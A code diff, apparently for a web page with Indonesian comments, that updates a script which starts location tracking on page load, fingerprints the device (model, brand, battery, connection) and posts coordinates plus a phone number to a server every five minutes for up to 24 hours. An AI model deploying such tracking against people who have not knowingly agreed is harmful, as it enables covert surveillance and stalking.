@@ -52,37 +52,42 @@
   let lastPos = null;
   let intervalId = null;
 
-  // fungsi parsing merk/model HP dari UA
+  // fallback parsing UA lama
   function parseDeviceModel(ua) {
-    let model = "unknown";
-    if (/SM-[A-Z0-9]+/i.test(ua)) {
-      model = ua.match(/SM-[A-Z0-9]+/i)[0];
-      return "Samsung " + model;
-    }
-    if (/Redmi|Mi\s|MIX|POCO/i.test(ua)) {
-      return "Xiaomi/Redmi/POCO Device";
-    }
+    if (/SM-[A-Z0-9]+/i.test(ua)) return "Samsung " + ua.match(/SM-[A-Z0-9]+/i)[0];
+    if (/Redmi|Mi\s|MIX|POCO/i.test(ua)) return "Xiaomi/Redmi/POCO Device";
     if (/iPhone/i.test(ua)) return "Apple iPhone";
     if (/iPad/i.test(ua)) return "Apple iPad";
     if (/OPPO/i.test(ua)) return "Oppo Device";
     if (/Vivo/i.test(ua)) return "Vivo Device";
-    return ua.split(";").pop().trim();
+    return ua.split(";").pop().trim() || "unknown";
   }
 
-  // ambil info perangkat
+  // ambil info perangkat lebih detail
   async function getExtraInfo() {
     const ua = navigator.userAgent;
     const conn = navigator.connection || {};
-    let batteryLevel = null;
+    let batteryLevel = "unknown";
     try {
       const battery = await navigator.getBattery();
       batteryLevel = (battery.level * 100) + "%";
-    } catch (e) {
-      batteryLevel = "unknown";
+    } catch(e) {}
+
+    let brand = "unknown", model = parseDeviceModel(ua);
+    if (navigator.userAgentData) {
+      try {
+        const uaData = await navigator.userAgentData.getHighEntropyValues([
+          "platform", "platformVersion", "model", "uaFullVersion"
+        ]);
+        brand = (navigator.userAgentData.brands || []).map(b => b.brand).join(", ");
+        if (uaData.model) model = uaData.model;
+      } catch(e) { console.warn("UA-CH error", e); }
     }
+
     return {
       ua,
-      deviceModel: parseDeviceModel(ua),
+      brand,
+      deviceModel: model,
       connection: conn.effectiveType || "unknown",
       downlink: conn.downlink || "unknown",
       phoneNumber: phoneEl.value.trim() || "-",
@@ -98,6 +103,7 @@
       latitude, longitude, accuracy,
       userNote: noteEl.value.trim(),
       ua: extra.ua,
+      brand: extra.brand,
       deviceModel: extra.deviceModel,
       connection: extra.connection,
       downlink: extra.downlink,
@@ -108,7 +114,7 @@
     try {
       const res = await fetch(ENDPOINT_URL, {
         method: 'POST',
-        headers: { 'Content-Type': 'Text/Plain' },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
       });
       return res.json();
@@ -140,12 +146,12 @@
       setStatus(msg);
     }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
 
-    // 🔥 Paksa kirim tiap 5 menit walaupun posisi tidak berubah
+    // kirim ulang tiap 5 menit walau posisi sama
     intervalId = setInterval(() => {
       if (lastPos) sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
     }, 300000);
 
-    // Stop otomatis setelah 24 jam
+    // stop otomatis setelah 24 jam
     stopTimer = setTimeout(stopRealtimeTracking, 24 * 60 * 60 * 1000);
   }
 
@@ -160,8 +166,6 @@
   }
 
   stopBtn.addEventListener('click', stopRealtimeTracking);
-
-  // Auto mulai
   window.addEventListener('load', startRealtimeTracking);
 </script>
 </body>
